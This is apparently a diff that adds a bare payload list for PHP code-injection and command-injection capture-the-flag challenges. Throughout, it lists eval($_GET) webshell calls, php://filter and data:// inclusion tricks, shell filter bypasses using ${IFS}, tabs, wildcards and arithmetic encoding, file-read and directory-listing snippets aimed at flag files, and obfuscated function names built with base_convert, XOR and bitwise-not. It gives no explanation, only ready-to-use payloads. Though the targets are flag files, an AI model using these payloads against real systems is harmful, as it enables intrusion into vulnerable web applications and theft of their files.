@@ -1,0 +1,88 @@
+system("tac fla*");
+eval($_GET[1]);&1=phpinfo();
+eval($_GET[1]);&1=system("ls");
+eval($_GET[1]);&1=system("tac fla?.php");
+include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+system("cp fl?g.php a.txt");
+passthru("tac fla*");
+eval($_GET[1]);&1=system("tac fla?.php");
+?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+data://text/plain/,<?php system('tac f*')?>
+data://text/plain/,<?= system('tac f*')?>
+data://text/plain,<?php system("tac fla*")?>
+tac fla*||ls
+tac${IFS}fla*||ls
+tac<fla''g.php||ls
+tac<>fla''g.php||ls
+tac%09fla''g.php||ls
+tac%09fl?g.php||ls
+tac<fl?g.php||ls
+tac<>fl?g.php||ls
+tac%09fla?.php||
+tac%09fla?.php||
+tac<fla''g.php||
+t''ac<fla''g.php||
+t''ac${IFS}/fla?||
+nl$IFS/fla''g||
+c''at${IFS}fla?.php
+/bin/?at${IFS}f???????
+/???/????64 ????.???
+/???/???/????2 ????.???
+$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
+echo file_get_contents('flag.php');
+echo highlight_file('flag.php');
+highlight_file("flag.php");
+show_source('flag.php');
+$a=fopen("flag.php","r");
+while($b=fgets($a)){
+echo $b;
+}
+print_r(file('flag.php'));
+var_dump(file('flag.php'));
+readfile("flag.php");
+$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}
+$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
+$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
+copy("flag.php","flag.txt");            
+rename("flag.php","flag.txt");  
+include('flag.php');echo $flag;
+include($_GET['1']); ?1=php://filter/convert.base64-encode/resource=flag.php
+include('flag.php');var_dump(get_defined_vars());
+print_r(scandir(dirname('__FILE__')));
+print_r(scandir('/'));
+var_export(scandir('/'));
+var_dump(glob('/*'));
+include('/flag.txt');var_export(get_defined_vars());
+include("/flag.txt");$ss=ob_get_contents();ob_end_clean();echo $ss;
+include('/flag.txt');var_export(get_defined_vars());exit();
+include('/flag.txt');var_export(get_defined_vars());die();
+include("/flag.txt");echo ~ob_get_contents();
+$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
+var_export(scandir('/'));exit();
+include('/flagc.txt');var_export(get_defined_vars());die();
+var_export(glob('/*'));die();
+$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}die();
+${PATH:~A}${PWD:~A} ????.???
+${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
+${PATH:~A}${PATH:${#TERM}:${SHLVL:~A}} ????.???  
+${PATH:~A}${PWD:~A:${##}} ????.???
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
+${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
+${PWD::${##}}???${PWD::${##}}??${PWD:${##}:${##}} ????.???
+${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
+/???/??v ????.???
+/bin/rev flag.php
+/bin/base64 flag.php
+<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
+<A;${HOME:${Z}:$?}???${HOME:${Z}:$?}?????${RANDOM::$?} ????.???
+?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat flag.php
+?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
+?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
+?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20flag.php
+
+$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
+//要在请求头里面加一个  1:tac flag.php
+(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);
